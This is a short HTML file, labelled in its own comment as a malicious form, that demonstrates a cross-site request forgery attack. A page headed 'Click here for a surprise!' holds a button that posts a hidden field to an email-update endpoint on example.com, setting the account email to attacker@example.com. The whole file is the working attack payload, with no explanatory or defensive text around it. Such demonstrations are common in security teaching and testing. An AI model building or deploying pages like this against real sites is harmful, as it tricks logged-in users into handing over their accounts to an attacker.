<!-- Malicious HTML form -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Attack</title>
</head>
<body>
  <h1>Click here for a surprise!</h1>
  <form action="http://example.com/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="submit" value="Click Me!">
  </form>
</body>
</html>
